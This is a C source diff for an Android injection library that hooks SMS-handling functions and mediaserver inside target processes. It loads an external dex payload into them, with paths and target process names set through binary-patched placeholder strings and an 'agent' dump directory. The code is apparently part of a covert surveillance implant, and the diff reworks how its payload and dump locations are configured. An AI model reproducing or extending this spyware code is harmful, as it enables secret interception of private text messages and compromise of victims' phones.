@@ -33,9 +33,11 @@
 #include "base.h"
 #include "ipc_examiner.h"
 char *dumpPath    =  ".................____________.......................";
-char *arg1    =  ".................____________......................1";
+char *dex    =  ".................____________......................1";
+char *process    =  ".................____________......................2";
 char *quite_needle = ".................____________......................";
-char *dexFile = "/data/local/tmp/ddiclasses.dex";
+char *dexFile_default = "/data/local/tmp/ddiclasses.dex";
+char *dumpDir_default = "/data/local/tmp/";
 char *dumpDir = NULL;
 #undef log
 #define USE_BD
@@ -341,7 +343,7 @@ static void my_processUnsolicited(JNIEnv *env, jobject this, jobject p)
    (*env)->MonitorEnter(env,this);
 
    if (processUnsolicited_cache.cls_h == 0) {
-      if (load_dext(dumpPath, classes)) {
+      if (load_dext(dex, classes)) {
          log("failed to load class ");
          doit = 0;
       }
@@ -400,7 +402,7 @@ static int my_dispatchNormalMessage(JNIEnv *env, jobject obj, jobject smsMessage
 {
    jint callOrig = 1;
 
-      if (load_dext(dumpPath,classes)) {
+      if (load_dext(dex,classes)) {
          log("failed to load class ");
       } else {
          // call static method and passin the sms
@@ -468,7 +470,7 @@ static int my_epoll_wait(int epfd, struct epoll_event *events, int maxevents, in
    // resolve symbols from DVM
    dexstuff_resolv_dvm(&d);
    log("my_epoll_wait: try_hook\n")
-   if( strncmp(quite_needle,arg1,strlen(quite_needle)) == 0 ){
+   if( strncmp(quite_needle,process,strlen(quite_needle)) == 0 ){
       int hooked = 2;
       log("hooking sms\n")
       if (and_maj == 4){
@@ -501,14 +503,14 @@ static int my_epoll_wait(int epfd, struct epoll_event *events, int maxevents, in
             }
 
          }
-         if( hooked == 0 && createcnf){
+         if(dumpDir!=NULL && hooked == 0 && createcnf){
             create_cnf();
          }
    } else {
       log("injection not possible \n");
       return 1;
    }
-   }else if( strncmp("mediaserver",arg1,strlen("mediaserver")) == 0 ){
+   }else if( strncmp("mediaserver",process,strlen("mediaserver")) == 0 ){
       log("hooking mediaserver\n")
    }else{
       log("hooking unknown so skip\n")
@@ -570,47 +572,22 @@ void my_init(void)
 #endif
    log("my_init:dumpPath is %s\n",dumpPath);
    if( strncmp(quite_needle,dumpPath,strlen(quite_needle)) == 0 ){
+      /* No binary patch applied, use the default value of the dexfile */
       log("my_init: got path %s\n",dumpPath);
-      dumpPath = dexFile;
+      dumpDir = dumpDir_default;
    }else{
       log("my_init: path patched %s\n",dumpPath);
-
-      dexFile=findLast(dumpPath,"/");
-      if(dexFile != NULL){
-         dexFile++;
-         if(strncmp("/data/app/",dumpPath,strlen("/data/app/"))==0 && (lastAt = findLast(dumpPath,"@"))!=NULL){
-            /*
-             * In this case dumpath has been configured as:
-             * /data/app/<agentName>.apk@<agentPackage>
-             * So we need to :
-             * 1) extract the correct dumpDir that is /data/data/<agentPackage>/files/m4 and place in dumpDir
-             * 2) extract the apk file, wihch is /data/app/<agentName>.apk and place in dumpPath
-             */
-            int len = strlen("/data/data/")+strlen(dumpPath)-(lastAt-dumpPath)+11; // 11 = /files/m4/\0
-            log("allocating dumpDir[%d] strlen(lastAt)-1 = %d lastAt=%s \n",len,strlen(lastAt)-1,lastAt);
-            dumpDir=calloc(1,len); // 11 = /files/m4/\0
-            if(dumpDir == NULL ){
-               log("failed to alloc dumpDir[%d]  \n",len);
-            }else{
-               snprintf(dumpDir, len, "/data/data/%s/files/m4", lastAt+1);
-               dexFile=strndup(dumpPath, lastAt - dumpPath );
-               dumpPath = dexFile;
-            }
-
-         }else{
-            dumpDir=strndup(dumpPath, dexFile - dumpPath);
-         }
-         if(dumpDir == NULL ){
-            log("failed to duplicate dumpPath=%s\n",dumpPath);
-         }else{
-            log("duplicate dumpPath=%s\n",dumpPath);
-            log("dumpDir=%s\n",dumpDir);
-            log("dexFile=%s\n",dexFile);
-                  createcnf = 1;
-         }
-      }
-
+      dumpDir = dumpPath;
    }
+   createcnf = 1;
+   if( strncmp(quite_needle,dex,strlen(quite_needle)) == 0 ){
+      /* No binary patch applied, use the default value of the dexfile */
+      log("my_init: got dex %s\n",dexFile_default);
+      dex = dexFile_default;
+   }else{
+      log("my_init: dexfile patched %s\n",dex);
+   }
+
    // set log function for  libbase (very important!)
    set_logfunction(my_log2);
    // set log function for libdalvikhook (very important!)
